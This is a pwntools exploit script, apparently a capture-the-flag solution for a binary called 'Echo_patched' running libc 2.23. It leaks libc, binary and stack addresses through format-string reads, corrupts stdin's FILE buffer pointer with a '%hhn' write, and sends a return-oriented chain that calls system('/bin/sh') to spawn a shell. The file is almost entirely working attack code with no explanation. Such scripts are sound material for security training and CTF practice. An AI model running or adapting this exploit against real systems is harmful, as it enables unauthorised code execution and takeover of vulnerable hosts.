from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
# breakrva 0x1042
breakrva 0x106d
continue
'''.format(**locals())

#Binary filename
exe = './Echo_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc = ELF("./libc-2.23.so")

'''
Tuong tu bai Echo_back

'''

def setName(name):
    p.recvuntil('Choice >>')
    p.sendline(str(1))
    p.recvuntil('name:')
    name = name.ljust(7, b'\x00')
    p.send(name)

def echo(size ,content):
    p.recvuntil('Choice >>')
    p.sendline(str(2))
    p.recvuntil('size:')
    p.sendline(size)
    content = content.ljust(7, b'\x00')
    p.send(content)

def exit():
    p.sendlineafter(b"Choice >>", "3")

pop_rdi = 0x00000000000011b3

echo("7", b"%21$p")
p.recvuntil(b"0x")
leak_libc = int(p.recv(12), 16)
log.info("leak libc = " + hex(leak_libc))
libc.address = leak_libc - 0x20840
log.info("libc = " + hex(libc.address))
stdin_arr = libc.sym['_IO_2_1_stdin_']
buf_base = libc.sym['_IO_2_1_stdin_'] + 0x8*7
log.info("stdin_arr = " + hex(buf_base))

echo("7", b"%15$p")
p.recvuntil(b"say:0x")
leak_elf = int(p.recv(12), 16)
log.info("leak elf = " + hex(leak_elf))
elf.address = leak_elf - 0x1107
log.info("elf = " + hex(elf.address))

echo("7", b"%14$p")
p.recvuntil(b"say:0x")
leak_ret = int(p.recv(12), 16)
main_ret_addr = leak_ret + 0x8
log.info("ret = "+ hex(main_ret_addr))

setName(p64(buf_base))
echo("7", "%16$hhn")

payload = p64(stdin_arr + 0x83) * 3 + p64(main_ret_addr) 
payload += p64(main_ret_addr + 0x18)
# 24 bytes first is the same 
echo("\n", payload)

for i in range(len(payload) - 1):
    p.sendlineafter(b"choice>> ", "2")
    p.sendlineafter(b"length:", "")

# pause()
payload = p64(elf.address + pop_rdi) + p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym['system'])
echo("\n", payload)
exit()

p.interactive()